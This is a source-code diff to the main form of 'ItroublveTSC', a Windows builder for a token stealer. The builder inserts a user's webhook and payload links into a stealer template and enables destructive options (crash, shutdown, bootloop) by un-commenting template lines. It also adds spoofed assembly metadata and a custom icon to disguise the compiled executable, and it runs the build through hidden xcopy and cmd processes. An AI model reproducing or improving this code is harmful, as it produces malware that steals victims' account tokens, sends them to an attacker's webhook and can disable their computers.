@@ -8,6 +8,7 @@ using System.IO.Compression;
 using System.Net;
 using System.Threading;
 using System.Windows.Forms;
+using ItroublveTSC2;
 
 
 namespace ItroublveTSC
@@ -24,14 +25,19 @@ namespace ItroublveTSC
             Rainbow.RainbowEffect();
             this.pnlRainbowTop.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
             this.PnlRainbowDown.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
+            this.pictureBox1.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
         }
 
         private void frmMain_Load(object sender, EventArgs e)
         {
+            if (Directory.Exists("bin_copy"))
+            {
+                Directory.Delete("bin_copy", true);
+            }
         }
         private void CreateBtn_Click(object sender, EventArgs e)
         {
-            bool flag = this.WebHookTxt.Text == "" || this.WebHookTxt.Text == "WebHook Here";
+            bool flag = this.WebHookTxt.Text == "" || this.WebHookTxt.Text == "Webhook Here";
             if (flag)
             {
                 MessageBox.Show("You need to paste a Webhook first!", "ItroublveTSC");
@@ -39,19 +45,18 @@ namespace ItroublveTSC
             else
             {
                 string _TokenStealer = "TokenStealer.bin";
-                string _cdDir = Path.GetDirectoryName(Application.ExecutablePath) + "/output";
+                string _cdDir = "output";
                 string _CopyTokenStealer = "TokenStealerCOPY.bin";
-                if (File.Exists(_CopyTokenStealer))
-                {
-                    File.Delete(_CopyTokenStealer);
-                }
                 if (Directory.Exists(_cdDir))
                 {
                     Directory.Delete(_cdDir, true);
                 }
                 try
                 {
-                    File.Copy(_TokenStealer, _CopyTokenStealer);
+                    if (!File.Exists(_CopyTokenStealer))
+                    {
+                        File.Copy(_TokenStealer, _CopyTokenStealer);
+                    }
                     string text = File.ReadAllText("TokenStealerCOPY.bin");
                     if (CrashPCchkbox.Checked)
                     {
@@ -64,6 +69,10 @@ namespace ItroublveTSC
                     if (ShutdownPCchkbox.Checked)
                     {
                         text = text.Replace("rem SHUTDOWN /s /t 30 /c", "SHUTDOWN /s /t 30 /c");
+                    }
+                    if (BootloopPCchckbox.Checked)
+                    {
+                        text = text.Replace("rem test", "");
                     }
                     text = text.Replace("Webhook", WebHookTxt.Text);
                     File.WriteAllText("TokenStealerCopy.bin", text);
@@ -82,6 +91,14 @@ namespace ItroublveTSC
         }
         private void CloseBtn_Click(object sender, EventArgs e)
         {
+            if (File.Exists("TokenStealerCOPY.bin"))
+            {
+                File.Delete("TokenStealerCOPY.bin");
+            }
+            if (Directory.Exists("bin_copy"))
+            {
+                Directory.Delete("bin_copy", true);
+            }
             Environment.Exit(0);
         }
         private void HeadServerLbl_MouseDown(object sender, MouseEventArgs e)
@@ -104,12 +121,17 @@ namespace ItroublveTSC
         private void roundBtn1_Click(object sender, EventArgs e)
         {
             bool flag = this.FinalresbatTxt.Text == "" || this.FinalresbatTxt.Text == "Token Stealer.bat Link Here";
-            bool flag4 = this.SendhookfileTxt.Text == "" || this.SendhookfileTxt.Text == "Sendhookfile.exe Link Here";
+            bool flag1 = this.SendhookfileTxt.Text == "" || this.SendhookfileTxt.Text == "Sendhookfile.exe Link Here";
+            bool flag2 = this.AssemblyTitleTxt.Text == "" || this.AssemblyTitleTxt.Text == "Assembly Title Here";
+            bool flag3 = this.AssemblyDescTxt.Text == "" || this.AssemblyDescTxt.Text == "Assembly Description Here";
+            bool flag4 = this.AssemblyProdTxt.Text == "" || this.AssemblyProdTxt.Text == "Assembly Product Here";
+            bool flag5 = this.AssemblyCopyrTxt.Text == "" || this.AssemblyCopyrTxt.Text == "Assembly © Copyright";
+            bool flag6 = this.AssemblyFileVTxt.Text == "" || this.AssemblyFileVTxt.Text == "File Version";
             if (flag)
             {
                 MessageBox.Show("You need to paste a link to Token stealer.bat!", "ItroublveTSC");
             }
-            if (flag4)
+            if (flag1)
             {
                 MessageBox.Show("You need to paste a link to Sendhookfile.exe!", "ItroublveTSC");
             }
@@ -117,17 +139,64 @@ namespace ItroublveTSC
             {
                 try
                 {
-                    Process copydir = new Process();
-                    ProcessStartInfo startCopydir = new ProcessStartInfo();
-                    startCopydir.WindowStyle = ProcessWindowStyle.Hidden;
-                    startCopydir.FileName = Path.Combine(Environment.SystemDirectory, "xcopy.exe");
-                    startCopydir.Arguments = @"bin bin_copy /Y /E /I";
-                    copydir.StartInfo = startCopydir;
-                    copydir.Start();
-                    Thread.Sleep(2000);
+                    string path = @"bin_copy";
+                    if (!Directory.Exists(path))
+                    {
+						new Process
+						{
+							StartInfo = new ProcessStartInfo
+							{
+								WindowStyle = ProcessWindowStyle.Hidden,
+								FileName = Path.Combine(Environment.SystemDirectory, "xcopy.exe"),
+								Arguments = "bin bin_copy /E /I"
+							}
+						}.Start();
+						Thread.Sleep(3000); 
+					}
                     string text = File.ReadAllText(@"bin_copy/Program.cs");
-                    text = text.Replace("finalresbatch", FinalresbatTxt.Text);
-                    text = text.Replace("sendhookfile", SendhookfileTxt.Text);
+                    string text2 = File.ReadAllText(@"bin_copy/Properties/AssemblyInfo.cs");
+                    text = text.Replace("finalresbatch", this.FinalresbatTxt.Text);
+                    text = text.Replace("sendhookfile", this.SendhookfileTxt.Text);
+                    if (flag2)
+                    {
+                        text2 = text2.Replace("titel", "");
+                    }
+                    else
+                    {
+                        text2 = text2.Replace("titel", AssemblyTitleTxt.Text);
+                    }
+                    if (flag3)
+                    {
+                        text2 = text2.Replace("deskription", "");
+                    }
+                    else
+                    {
+                        text2 = text2.Replace("deskription", AssemblyDescTxt.Text);
+                    }
+                    if (flag4)
+                    {
+                        text2 = text2.Replace("produkt", "");
+                    }
+                    else
+                    {
+                        text2 = text2.Replace("produkt", AssemblyProdTxt.Text);
+                    }
+                    if (flag5)
+                    {
+                        text2 = text2.Replace("rightcopy", "");
+                    }
+                    else
+                    {
+                        text2 = text2.Replace("rightcopy", AssemblyCopyrTxt.Text);
+                    }
+                    if (flag6)
+                    {
+                        text2 = text2.Replace("1.0.0.0", "1.0.0.0");
+                    }
+                    else
+                    {
+                        text2 = text2.Replace("1.0.0.0", AssemblyFileVTxt.Text);
+                    }
                     if (AutoRmvExe.Checked)
                     {
                         text = text.Replace("//RemoveEXE", "RemoveEXE");
@@ -139,6 +208,7 @@ namespace ItroublveTSC
                         text = text.Replace("*/", "");
                     }
                     File.WriteAllText(@"bin_copy/Program.cs", text);
+                    File.WriteAllText(@"bin_copy/Properties/AssemblyInfo.cs", text2);
 
                     Process.Start(new ProcessStartInfo()
                     {
@@ -147,7 +217,7 @@ namespace ItroublveTSC
                         CreateNoWindow = true,
                         FileName = "cmd.exe"
                     });
-                    Thread.Sleep(7000);
+                    Thread.Sleep(10000);
                 }
                 catch
                 {
@@ -174,13 +244,10 @@ namespace ItroublveTSC
                     string path = @"bin_copy\bin\debug\TOKEN STEALER CREATOR.exe";
                     string path2 = "Token Stealer.exe";
                     string folderPath = "bin_copy";
-                    if (File.Exists(folderPath))
-                    {
-                        File.Delete(folderPath);
-                    }
                     if (!File.Exists(path))
                     {
-                        using (FileStream fs = File.Create(path)) { }
+                        MessageBox.Show("Failed to create Token Stealer, please try again or .NET framework is missing!", "ItroublveTSC");
+                        Environment.Exit(0);
                     }
                     if (File.Exists(path2))
                         File.Delete(path2);
@@ -190,7 +257,7 @@ namespace ItroublveTSC
                 }
                 catch (Exception ex)
                 {
-                    MessageBox.Show("Failed to create token stealer.\r\n.NET Framework might be missing, take a look below to know reason!\r\n" + (ex.Message), "ItroublveTSC");
+                    MessageBox.Show("Failed to create token stealer.\r\nTake a look below to know reason!\r\n" + (ex.Message), "ItroublveTSC");
                 }
             }
         }
@@ -219,12 +286,195 @@ namespace ItroublveTSC
             }
         }
 
-        private void BootloopPCchckbox_CheckedChanged(object sender, EventArgs e)
+        private void roundBtn2_Click(object sender, EventArgs e)
         {
-            if (BootloopPCchckbox.Checked)
+            if (!File.Exists("bin_copy/Program.cs"))
             {
-                MessageBox.Show("I'm still working on this feature - Bootloop PC", "ItroublveTSC");
-                BootloopPCchckbox.Checked = false;
+                new Process
+                {
+                    StartInfo = new ProcessStartInfo
+                    {
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        FileName = Path.Combine(Environment.SystemDirectory, "xcopy.exe"),
+                        Arguments = "bin bin_copy /E /I"
+                    }
+                }.Start();
+                Thread.Sleep(3000);
+            }
+            var fileContent = string.Empty;
+            var filePath = string.Empty;
+
+            using (OpenFileDialog openFileDialog = new OpenFileDialog())
+            {
+                openFileDialog.InitialDirectory = ".\\";
+                openFileDialog.Filter = "ICO files (*.ico)|*.ico";
+                openFileDialog.FilterIndex = 2;
+                openFileDialog.RestoreDirectory = true;
+
+                if (openFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    try
+                    {
+                        filePath = openFileDialog.FileName;
+
+
+                        var fileStream = openFileDialog.OpenFile();
+
+                        using (StreamReader reader = new StreamReader(fileStream))
+                        {
+                            fileContent = reader.ReadToEnd();
+                        }
+                        string text = File.ReadAllText(@"bin_copy/TOKEN STEALER CREATOR.csproj");
+                        text = text.Replace("<!--", "");
+                        text = text.Replace("-->", "");
+                        text = text.Replace("YourICON", filePath);
+                        File.WriteAllText(@"bin_copy/TOKEN STEALER CREATOR.csproj", text);
+                        IconPrePic.Image = new Bitmap(filePath);
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show("An error occured, Please send a screenshot of this below to; Itroublve Hacker...\r\n" +
+                            (ex), "ItroublveTSC");
+                    }
+                }
+                else
+                {
+                    MessageBox.Show("ICO not added.\r\n" +
+                        "Canceled by user", "ItroublveTSC");
+                }
+            }
+        }
+
+        private void roundBtn3_Click(object sender, EventArgs e)
+        {
+            frm2 fm = new frm2();
+            fm.ShowDialog();
+        }
+        private void WebHookTxt_Enter(object sender, EventArgs e)
+        {
+            if (WebHookTxt.Text == "Webhook Here")
+            {
+                WebHookTxt.Text = "";
+            }
+        }
+
+        private void WebHookTxt_Leave(object sender, EventArgs e)
+        {
+            if (WebHookTxt.Text == "")
+            {
+                WebHookTxt.Text = "Webhook Here";
+            }
+        }
+
+        private void FinalresbatTxt_Enter(object sender, EventArgs e)
+        {
+            if (FinalresbatTxt.Text == "Token Stealer.bat Link Here")
+            {
+                FinalresbatTxt.Text = "";
+            }
+        }
+
+        private void FinalresbatTxt_Leave(object sender, EventArgs e)
+        {
+            if (FinalresbatTxt.Text == "")
+            {
+                FinalresbatTxt.Text = "Token Stealer.bat Link Here";
+            }
+        }
+
+        private void SendhookfileTxt_Enter(object sender, EventArgs e)
+        {
+            if (SendhookfileTxt.Text == "Sendhookfile.exe Link Here")
+            {
+                SendhookfileTxt.Text = "";
+            }
+        }
+
+        private void SendhookfileTxt_Leave(object sender, EventArgs e)
+        {
+            if (SendhookfileTxt.Text == "")
+            {
+                SendhookfileTxt.Text = "Sendhookfile.exe Link Here";
+            }
+        }
+
+        private void CustomExeTxt_Enter(object sender, EventArgs e)
+        {
+            if (CustomExeTxt.Text == "Custom EXE Link Here")
+            {
+                CustomExeTxt.Text = "";
+            }
+        }
+
+        private void CustomExeTxt_Leave(object sender, EventArgs e)
+        {
+            if (CustomExeTxt.Text == "")
+            {
+                CustomExeTxt.Text = "Custom EXE Link Here";
+            }
+        }
+
+        private void AssemblyTitleTxt_Enter(object sender, EventArgs e)
+        {
+            if (AssemblyTitleTxt.Text == "Assembly Title Here")
+            {
+                AssemblyTitleTxt.Text = "";
+            }
+        }
+
+        private void AssemblyTitleTxt_Leave(object sender, EventArgs e)
+        {
+            if (AssemblyTitleTxt.Text == "")
+            {
+                AssemblyTitleTxt.Text = "Assembly Title Here";
+            }
+        }
+
+        private void AssemblyDescTxt_Enter(object sender, EventArgs e)
+        {
+            if (AssemblyDescTxt.Text == "Assembly Description Here")
+            {
+                AssemblyDescTxt.Text = "";
+            }
+        }
+
+        private void AssemblyDescTxt_Leave(object sender, EventArgs e)
+        {
+            if (AssemblyDescTxt.Text == "")
+            {
+                AssemblyDescTxt.Text = "Assembly Description Here";
+            }
+        }
+
+        private void AssemblyProdTxt_Enter(object sender, EventArgs e)
+        {
+            if (AssemblyProdTxt.Text == "Assembly Product Here")
+            {
+                AssemblyProdTxt.Text = "";
+            }
+        }
+
+        private void AssemblyProdTxt_Leave(object sender, EventArgs e)
+        {
+            if (AssemblyProdTxt.Text == "")
+            {
+                AssemblyProdTxt.Text = "Assembly Product Here";
+            }
+        }
+
+        private void AssemblyCopyrTxt_Enter(object sender, EventArgs e)
+        {
+            if (AssemblyCopyrTxt.Text == "Assembly © Copyright")
+            {
+                AssemblyCopyrTxt.Text = "";
+            }
+        }
+
+        private void AssemblyCopyrTxt_Leave(object sender, EventArgs e)
+        {
+            if (AssemblyCopyrTxt.Text == "")
+            {
+                AssemblyCopyrTxt.Text = "Assembly © Copyright";
             }
         }
     }
